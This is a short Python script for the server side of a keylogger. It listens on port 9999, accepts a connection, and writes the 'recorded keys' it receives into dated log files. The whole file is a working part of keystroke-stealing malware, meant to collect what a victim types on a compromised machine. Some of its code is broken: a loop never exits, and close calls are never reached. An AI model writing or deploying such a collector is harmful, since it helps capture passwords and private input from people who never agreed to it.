import socket
from datetime import datetime


host = socket.gethostname()
port = 9999 
server = socket.socket()

#Binding the host and listening on port 9999
server.bind((host, port))
server.listen(1) 

while True:

    connection, address = server.accept()
    print("Connected by " + address[0])

    while True:

        #Recieving the recorded keys
        data = connection.recv(1024).decode()

        if data:

            #Getting the current time for the filename
            now = datetime.now()
            date = now.strftime('%d\%m\%Y') + '.log'
            
            #Writing the keys to a file
            KeyReciever = open(date,'a')
            print(str(data))
            KeyReciever.write(str(data))
            
    KeyReciever.close()
    connection.close()
    break
